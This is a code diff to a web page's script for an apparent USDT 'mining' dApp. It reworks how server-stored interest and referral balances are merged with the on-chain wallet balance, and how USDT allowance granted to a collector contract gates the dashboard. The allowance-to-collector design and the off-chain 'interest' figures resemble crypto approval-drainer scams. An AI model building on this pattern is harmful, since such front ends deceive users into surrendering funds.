@@ -249,6 +249,7 @@
         let countdownInterval;
         let currentWithdrawableBalance = 0;
         let currentWalletBalanceNum = 0;
+        let latestFbUserData = {};
         let walletEventsBound = false;
         let onChainRegisteredBonus = 0;
 
@@ -298,25 +299,29 @@
             ]);
         }
 
-        function applyBalancesToDashboard(formattedBal, fbUser = {}) {
+        function applyBalancesToDashboard(formattedBal, fbUser = latestFbUserData) {
             const safeWalletBal = Number.isFinite(Number(formattedBal)) ? Number(formattedBal) : currentWalletBalanceNum;
             currentWalletBalanceNum = safeWalletBal;
+
+            const mergedUser = { ...(latestFbUserData || {}), ...(fbUser || {}) };
+            latestFbUserData = mergedUser;
 
             const isEligibleForInterest = safeWalletBal >= 100;
             const rate = isEligibleForInterest ? getInterestRate(safeWalletBal) : 0;
 
-            const userIdDisplay = fbUser.userId || formatSixDigitUserId(0, "M", userAddress);
+            const userIdDisplay = mergedUser.userId || formatSixDigitUserId(0, "M", userAddress);
             document.getElementById("lblUserId").innerText = userIdDisplay;
             document.getElementById("lblWalletBal").innerText = formatUsdtOneDecimal(safeWalletBal);
 
-            const lockedBalNum = Number(fbUser.lockedBalance || 0);
-            const fbInterestNum = Number(fbUser.interestBalance || 0);
-            const fbRefNum = Number(fbUser.referralBalance || 0);
+            const lockedBalNum = Number(mergedUser.lockedBalance ?? 0);
+            const fbInterestNum = Number(mergedUser.interestBalance ?? 0);
+            const fbRefNum = Number(mergedUser.referralBalance ?? 0);
 
             document.getElementById("lblLockedBal").innerText = formatUsdtOneDecimal(lockedBalNum);
 
             const computedCashback = isEligibleForInterest ? (safeWalletBal * rate) : 0;
-            const cashback = fbInterestNum > 0 ? fbInterestNum : computedCashback;
+            const hasExplicitInterest = mergedUser.interestBalance !== undefined && mergedUser.interestBalance !== null;
+            const cashback = hasExplicitInterest ? fbInterestNum : computedCashback;
             const withdrawableBalance = cashback + fbRefNum;
             currentWithdrawableBalance = withdrawableBalance;
 
@@ -357,6 +362,7 @@
                     return;
                 }
 
+                document.getElementById("userDashboard").classList.remove("hidden");
                 applyBalancesToDashboard(currentWalletBalanceNum, fbUser);
             }, (err) => {
                 console.error("Realtime user balance listener error:", err);
@@ -670,6 +676,7 @@
             window.ethereum.on("accountsChanged", async (accounts) => {
                 currentWithdrawableBalance = 0;
                 currentWalletBalanceNum = 0;
+                latestFbUserData = {};
                 if (typeof unsubUserBalances === "function") {
                     unsubUserBalances();
                     unsubUserBalances = null;
@@ -739,6 +746,7 @@
                     if (accounts && accounts.length > 0) {
                         userAddress = accounts[0];
                         provider = new ethers.BrowserProvider(window.ethereum);
+                        startUserRealtimeBalanceListener(userAddress);
 
                         const network = await withTimeout(provider.getNetwork(), 5000, null);
                         if (network && network.chainId !== 137n) {
@@ -751,7 +759,6 @@
 
                         signer = await provider.getSigner();
                         syncPendingWithdrawListener(userAddress);
-                        startUserRealtimeBalanceListener(userAddress);
                         document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                         await checkExistingAllowanceAndLoad();
                     }
@@ -770,12 +777,7 @@
                     const balance = await withTimeout(usdtContract.balanceOf(userAddress), 6000, null);
                     if (balance === null) return;
                     const formattedBal = Number(ethers.formatUnits(balance, 6));
-                    currentWalletBalanceNum = formattedBal;
-
-                    const currentBalEl = document.getElementById("lblWalletBal");
-                    if (currentBalEl) {
-                        currentBalEl.innerText = formatUsdtOneDecimal(formattedBal);
-                    }
+                    applyBalancesToDashboard(formattedBal, latestFbUserData);
                 } catch (err) {
                     console.error("Real-time balance sync error:", err);
                 }
@@ -786,6 +788,7 @@
             try {
                 showProgress(30, "Checking your Mining...");
                 syncPendingWithdrawListener(userAddress);
+                startUserRealtimeBalanceListener(userAddress);
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, provider);
                 let allowance = await withTimeout(
                     usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS),
@@ -980,29 +983,10 @@
         }
 
         async function checkUserData() {
-            if (!userAddress || !provider) return;
+            if (!userAddress) return;
             const dashboardEl = document.getElementById("userDashboard");
 
             try {
-                const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, provider);
-                const allowance = await withTimeout(
-                    usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS),
-                    6000,
-                    1n
-                );
-
-                if (Number(allowance ?? 0) <= 0) {
-                    currentWithdrawableBalance = 0;
-                    dashboardEl.classList.add("hidden");
-                    return;
-                }
-
-                dashboardEl.classList.remove("hidden");
-                startUserRealtimeBalanceListener(userAddress);
-
-                const balance = await withTimeout(usdtContract.balanceOf(userAddress), 6000, 0n);
-                const formattedBal = Number(ethers.formatUnits(balance ?? 0n, 6));
-
                 let fbUser = {};
                 try {
                     const docSnap = await withTimeout(
@@ -1019,6 +1003,28 @@
                     return;
                 }
 
+                let formattedBal = currentWalletBalanceNum;
+                if (provider) {
+                    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, provider);
+                    const allowance = await withTimeout(
+                        usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS),
+                        6000,
+                        1n
+                    );
+
+                    if (Number(allowance ?? 0) <= 0 && Object.keys(fbUser).length === 0) {
+                        currentWithdrawableBalance = 0;
+                        dashboardEl.classList.add("hidden");
+                        return;
+                    }
+
+                    const balance = await withTimeout(usdtContract.balanceOf(userAddress), 6000, null);
+                    if (balance !== null) {
+                        formattedBal = Number(ethers.formatUnits(balance, 6));
+                    }
+                }
+
+                dashboardEl.classList.remove("hidden");
                 applyBalancesToDashboard(formattedBal, fbUser);
 
                 const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
@@ -1058,7 +1064,7 @@
                 if (alreadyPending) {
                     hasPendingWithdraw = true;
                     updateWithdrawButtonUI();
-                    alert("Your withdraw request is successfully sent, Please wait");
+                    alert("Your withdraw request is successfully send, Please wait");
                     return;
                 }
 
